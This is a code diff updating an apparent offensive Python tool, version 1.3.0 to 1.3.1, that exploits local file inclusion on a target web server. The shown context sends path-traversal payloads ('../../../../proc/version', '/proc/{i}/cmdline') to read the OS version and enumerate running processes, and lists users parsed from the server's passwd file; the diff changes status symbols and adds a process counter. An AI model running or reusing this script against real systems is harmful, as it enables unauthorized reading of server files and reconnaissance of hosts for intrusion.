@@ -12,7 +12,7 @@ def print_banner():
      |  ___/ '__/ _ \ / __| |     \___ \ 
      | |   | | | (_) | (__| |____ ____) |
      |_|   |_|  \___/ \___|______|_____/"""
-    version = "1.3.0"
+    version = "1.3.1"
     credit = f"{' ' * 34}By Abgache\n{' ' * 34}Version: {version}\n"
     print(banner)
     print(credit)
@@ -72,12 +72,14 @@ def main():
         print(f"{Fore.GREEN}[+]{Style.RESET_ALL} LFI confirmed")
         passwd=passwd_ls(test.text)
         for usr in passwd:
-            print(f"{Fore.CYAN}[+]{Style.RESET_ALL} User found: {usr[0]}, Home: {usr[1]}")
+            print(f"{Fore.CYAN}[/]{Style.RESET_ALL} User found: {usr[0]}, Home: {usr[1]}")
         
 
     ver_url = f"{base}/{args.path}?{args.param}=../../../../proc/version"
     ver = requests.get(ver_url, timeout=3)
     print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} OS Version: {ver.text.strip()}\n")
+
+    host_len = 0
 
     for i in range(1, args.max + 1):
         url = f"{base}/{args.path}?{args.param}=../../../../proc/{i}/cmdline"
@@ -87,12 +89,14 @@ def main():
 
             content = r.text.strip().lower()
             if r.ok and r.text.strip() and content and not any(b in content for b in bad_keywords):
+                host_len += 1
                 print(f"\r{Fore.GREEN}[+]{Style.RESET_ALL} /proc/{i}/cmdline -> {r.text[:200]}")
             else:
                 print(f"\r{Fore.RED}[-]{Style.RESET_ALL} /proc/{i}/cmdline -> No data", end="")
 
         except requests.RequestException:
             continue
+    print(f"\r{Fore.CYAN}[/]{Style.RESET_ALL} Enumeration completed, {host_len} processes found.")
 
 if __name__ == "__main__":
     print_banner()
